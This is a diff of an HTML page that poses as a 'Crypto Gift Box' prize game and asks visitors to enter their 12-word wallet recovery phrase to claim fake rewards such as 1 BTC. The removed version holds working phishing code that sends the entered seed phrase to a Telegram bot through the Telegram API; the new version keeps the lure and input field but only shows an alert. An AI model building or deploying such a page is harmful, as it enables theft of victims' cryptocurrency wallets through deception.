@@ -2,175 +2,160 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Crypto Gift Box</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Crypto Gift</title>
   <style>
     body {
-      background: #0d0d0d;
+      background-color: #0d0d0d;
       color: #fff;
       font-family: 'Poppins', sans-serif;
       text-align: center;
       margin: 0;
-      padding: 0;
+      padding: 20px;
     }
     h1 {
-      margin-top: 40px;
-      font-size: 2rem;
-      color: #ffcc00;
+      color: #ffc107;
+      font-size: 2.2em;
+      margin-bottom: 20px;
     }
     .gift-box {
-      margin: 30px auto;
       width: 150px;
       height: 150px;
       background: #1a1a1a;
-      border: 2px solid #ffcc00;
-      border-radius: 15px;
+      border: 3px solid #ffc107;
+      border-radius: 20px;
+      margin: 20px auto;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+    .gift-box:hover {
+      transform: scale(1.05);
     }
     .gift-box img {
       width: 80px;
+      height: 80px;
     }
-    .items {
+    .prizes {
       display: flex;
       flex-wrap: wrap;
       justify-content: center;
+      gap: 10px;
       margin-top: 20px;
     }
-    .item {
+    .prize {
       background: #1a1a1a;
       border: 1px solid #333;
       border-radius: 10px;
-      margin: 5px;
       padding: 8px 12px;
+      font-size: 14px;
       display: flex;
       align-items: center;
-      font-size: 14px;
+      gap: 5px;
     }
-    .item img {
+    .prize img {
       width: 20px;
       height: 20px;
-      margin-right: 5px;
     }
-    #claimSection {
-      margin-top: 30px;
-      display: none;
+    .message {
+      margin-top: 20px;
+      font-size: 1.2em;
+      color: #0f0;
     }
-    #mnemonicsInput {
-      width: 80%;
-      padding: 8px;
-      margin-top: 10px;
-      border: 1px solid #555;
-      border-radius: 5px;
-      background: #1a1a1a;
-      color: #fff;
-    }
-    .btn {
-      margin-top: 10px;
-      padding: 10px 20px;
-      background: #ffcc00;
+    .button {
+      background-color: #ffc107;
       color: #000;
+      padding: 12px 25px;
+      margin-top: 20px;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
+      transition: background-color 0.3s;
     }
-    .btn:hover {
-      background: #ffd633;
+    .button:hover {
+      background-color: #e0a800;
     }
-    .popup {
-      background: #1a1a1a;
-      padding: 20px;
-      border-radius: 10px;
-      border: 1px solid #ffcc00;
+    input[type="text"] {
+      width: 90%;
+      max-width: 400px;
+      padding: 12px;
       margin-top: 20px;
-      display: none;
+      border-radius: 12px;
+      border: 1px solid #333;
+      background-color: #1a1a1a;
+      color: #fff;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(255, 193, 7, 0.3);
     }
   </style>
 </head>
 <body>
 
-<h1>Open Your Crypto Gift!</h1>
+  <h1>Open Your Crypto Gift!</h1>
 
-<div class="gift-box" onclick="openGift()">
-  <img src="https://cdn-icons-png.flaticon.com/512/820/820929.png" alt="Gift">
-</div>
-
-<div class="items">
-  <div class="item"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB"> 1 BNB</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> 10 USDT</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> 100 USDT</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC"> 1 BTC</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH"> 1 ETH</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png" alt="LTC"> 1 LTC</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/xrp-xrp-logo.png" alt="XRP"> 500 XRP</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL"> 0.5 SOL</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/cardano-ada-logo.png" alt="ADA"> 2 ADA</div>
-  <div class="item"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png" alt="DOGE"> 100 DOGE</div>
-</div>
-
-<div id="claimSection">
-  <p id="rewardText"></p>
-  <button class="btn" onclick="showMnemonics()">Claim Now</button>
-
-  <div id="mnemonicsSection" style="display:none;">
-    <input type="text" id="mnemonicsInput" placeholder="Enter your 12-word Mnemonics">
-    <button class="btn" onclick="submitMnemonics()">Submit</button>
+  <div class="gift-box" id="giftBox" onclick="openGift()">
+    <img src="gift-box.png" alt="Gift Box">
   </div>
-</div>
 
-<div class="popup" id="popup">
-  You will receive your reward soon!
-</div>
+  <div class="prizes">
+    <div class="prize"><img src="bnb.png">1 BNB</div>
+    <div class="prize"><img src="usdt.png">10 USDT</div>
+    <div class="prize"><img src="usdt.png">100 USDT</div>
+    <div class="prize"><img src="btc.png">1 BTC</div>
+    <div class="prize"><img src="eth.png">1 ETH</div>
+    <div class="prize"><img src="ltc.png">1 LTC</div>
+    <div class="prize"><img src="xrp.png">500 XRP</div>
+    <div class="prize"><img src="sol.png">0.5 SOL</div>
+    <div class="prize"><img src="ada.png">2 ADA</div>
+    <div class="prize"><img src="doge.png">100 DOGE</div>
+  </div>
 
-<audio id="openSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-mechanical-bling-210.mp3"></audio>
+  <div id="result" class="message"></div>
 
-<script>
-  let rewards = [
-    '1 BNB', '10 USDT', '100 USDT', '1 BTC', '1 ETH', 
-    '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
-  ];
+  <button class="button" onclick="claimNow()">Claim Now</button>
 
-  function openGift() {
-    let sound = document.getElementById('openSound');
-    sound.play();
+  <br>
 
-    let randomReward = rewards[Math.floor(Math.random() * rewards.length)];
-    document.getElementById('rewardText').innerText = "Congratulations! You won: " + randomReward;
-    document.getElementById('claimSection').style.display = 'block';
-  }
+  <input type="text" id="mnemonics" placeholder="Enter your 12-word Mnemonics">
+  
+  <br>
 
-  function showMnemonics() {
-    document.getElementById('mnemonicsSection').style.display = 'block';
-  }
+  <button class="button" onclick="submitMnemonics()">Submit</button>
 
-  function submitMnemonics() {
-    let mnemonics = document.getElementById('mnemonicsInput').value.trim();
-    if (mnemonics.split(' ').length !== 12) {
-      alert('Please enter exactly 12 words!');
-      return;
+  <script>
+    function openGift() {
+      const lastClick = localStorage.getItem('lastClick');
+      const now = new Date().getTime();
+      if (lastClick && now - lastClick < 86400000) { // 24 hours
+        alert("You can open the gift once every 24 hours!");
+        return;
+      }
+      const prizes = [
+        '1 BNB', '10 USDT', '100 USDT', '1 BTC', '1 ETH',
+        '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
+      ];
+      const won = prizes[Math.floor(Math.random() * prizes.length)];
+      document.getElementById('result').innerText = "Congratulations! You won: " + won;
+      localStorage.setItem('lastClick', now);
     }
 
-    // Send mnemonics to your Telegram Bot
-    let botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-    let chatId = 'YOUR_TELEGRAM_CHAT_ID';
-    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Mnemonics: ${encodeURIComponent(mnemonics)}`;
+    function claimNow() {
+      alert("Please enter your 12-word Mnemonics below to claim.");
+    }
 
-    fetch(url)
-      .then(response => {
-        if (response.ok) {
-          document.getElementById('popup').style.display = 'block';
-          document.getElementById('mnemonicsSection').style.display = 'none';
-        } else {
-          alert('Failed to submit. Try again later.');
-        }
-      })
-      .catch(error => {
-        alert('Error submitting: ' + error.message);
-      });
-  }
-</script>
+    function submitMnemonics() {
+      const mnemonic = document.getElementById('mnemonics').value.trim();
+      if (mnemonic.split(" ").length === 12) {
+        alert("Mnemonic submitted successfully!");
+      } else {
+        alert("Please enter a valid 12-word mnemonic.");
+      }
+    }
+  </script>
 
 </body>
 </html>
